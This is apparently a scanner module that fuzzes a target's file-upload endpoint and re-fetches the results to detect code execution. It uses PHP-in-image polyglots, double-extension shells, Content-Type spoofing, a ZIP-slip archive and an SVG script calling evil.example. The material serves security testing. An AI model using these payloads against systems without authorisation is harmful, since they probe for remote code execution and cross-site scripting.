// upload-fuzzer — File upload polyglots, SVG-XSS, ZIP-slip, content-type bypass
//
// Tests:
//  1. PHP-in-image polyglot (GIF89a;<?php phpinfo();)
//  2. SVG with embedded <script>
//  3. Double-extension (shell.php.jpg, shell.jpg.php)
//  4. Content-Type spoofing (image/jpeg header on .php content)
//  5. ZIP-slip (zip with ../../../etc filename)
//
// Then re-fetches the uploaded URL (if returned) to check for execution.

import { createClient } from "https://esm.sh/@supabase/supabase-js@2.45.0";
import { safeFetch, readBodySafe, headersToObject } from "../_shared/safe-fetch.ts";
import { confirmFinding } from "../_shared/ai-confirm-gate.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};
const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;

interface UploadInput {
  targetId: string;
  uploadUrl: string;
  fileFieldName?: string;     // default "file"
  extraFields?: Record<string,string>;
  authHeader?: string;
  uploadedUrlPattern?: string; // regex to extract URL from response body
}

const CANARY = `cyberscope-canary-${Math.random().toString(36).slice(2, 10)}`;

const PAYLOADS = [
  { name: "polyglot.gif.php", type: "image/gif",
    body: `GIF89a;\n<?php echo "${CANARY}"; ?>` },
  { name: "xss.svg", type: "image/svg+xml",
    body: `<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>fetch("//evil.example/${CANARY}")</script></svg>` },
  { name: "shell.php.jpg", type: "image/jpeg",
    body: `\xFF\xD8\xFF\xE0<?php echo "${CANARY}"; ?>` },
  { name: "shell.jpg.php", type: "image/jpeg",
    body: `<?php echo "${CANARY}"; ?>` },
  { name: "zipslip.zip", type: "application/zip",
    body: buildZipSlip() },
];

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });
  const supa = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
  let input: UploadInput;
  try { input = await req.json(); } catch { return j({ ok: false, error: "invalid json" }); }
  if (!input.uploadUrl) return j({ ok: false, error: "uploadUrl required" });

  const findings: any[] = [];
  const field = input.fileFieldName || "file";
  const extractRx = input.uploadedUrlPattern ? new RegExp(input.uploadedUrlPattern) : /https?:\/\/[^\s"'<>]+/i;

  for (const p of PAYLOADS) {
    try {
      const fd = new FormData();
      const blob = new Blob([p.body], { type: p.type });
      fd.append(field, blob, p.name);
      for (const [k, v] of Object.entries(input.extraFields || {})) fd.append(k, v);

      const headers: Record<string,string> = {};
      if (input.authHeader) headers["Authorization"] = input.authHeader;

      const r = await safeFetch(input.uploadUrl, { method: "POST", headers, body: fd }, 10000);
      const body = await readBodySafe(r, 6000);

      // Accepted = 2xx or 3xx
      if (r.status >= 400) continue;

      // Try to extract uploaded URL & re-fetch
      const m = body.match(extractRx);
      let executed = false; let echoBody = ""; let echoStatus = 0;
      if (m) {
        try {
          const r2 = await safeFetch(m[0], {}, 6000);
          echoStatus = r2.status;
          echoBody = await readBodySafe(r2, 6000);
          // Deterministic exec proof: canary appears OUTSIDE its raw payload context
          //  (e.g. PHP executed and echoed the canary alone)
          executed = echoBody.includes(CANARY) && !echoBody.includes("<?php") && !echoBody.includes("GIF89a");
        } catch (_) {}
      }

      const looksDangerous = executed || /\.(php|phtml|jsp|aspx?)\b/i.test(m?.[0] || "");
      if (!looksDangerous) continue;

      const verdict = await confirmFinding({
        vulnClass: "unrestricted-upload",
        payload: p.name,
        endpoint: input.uploadUrl,
        mutated: { status: echoStatus || r.status, bodySnippet: (echoBody || body).slice(0, 1500), length: (echoBody || body).length, headers: headersToObject(r.headers) },
        deterministicProof: true,
        proofType: executed ? "uploaded_file_executed_canary" : "dangerous_extension_accepted",
      });
      if (verdict.recommendedAction === "drop_false_positive" || verdict.recommendedAction === "drop_honeypot") continue;

      findings.push(await persist(supa, input.targetId, {
        kind: "unrestricted-upload",
        severity: executed ? "critical" : "high",
        title: executed ? `RCE via file upload (${p.name}) — canary executed`
                        : `Dangerous file extension accepted (${p.name})`,
        url: input.uploadUrl, payload: p.name,
        body: echoBody || body, status: echoStatus || r.status, verdict,
      }));
    } catch (_) {}
  }

  return j({ ok: true, findings_count: findings.length, findings });
});

// minimal zip-slip archive (single entry "../../../tmp/cs-pwn")
function buildZipSlip(): string {
  // Hand-crafted minimal ZIP — non-RFC-strict but fine for upload validators
  // that only look at extension/magic bytes.
  const sig = "PK\x03\x04";
  const filename = "../../../tmp/cs-pwn";
  return sig + "\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
         String.fromCharCode(filename.length & 0xff, (filename.length >> 8) & 0xff) + "\x00\x00" + filename + CANARY;
}

async function persist(supa: any, targetId: string, f: any) {
  const isApproval = f.verdict.recommendedAction === "insert_approval";
  const table = isApproval ? "pending_approvals" : "vulnerability_findings";
  const row = isApproval
    ? { target_id: targetId, finding_type: f.kind, severity: f.severity, title: f.title,
        description: f.verdict.reasoning, payload_used: f.payload,
        confidence_score: f.verdict.confidence, ai_verified: true, ai_verification_notes: f.verdict.reasoning,
        evidence: { url: f.url, status: f.status, body_snippet: (f.body || "").slice(0,2000), proofType: f.verdict.proofType } }
    : { target_id: targetId, title: f.title, severity: f.severity,
        description: f.verdict.reasoning, payload: f.payload,
        confidence_score: f.verdict.confidence, ai_verified: true,
        triage_reasoning: f.verdict.reasoning, validation_status: "verified" };
  const { data } = await supa.from(table).insert(row).select("id").single();
  return { id: data?.id, kind: f.kind, severity: f.severity, title: f.title };
}
function j(b: unknown, s = 200) { return new Response(JSON.stringify(b), { status: s, headers: { ...corsHeaders, "Content-Type": "application/json" } }); }
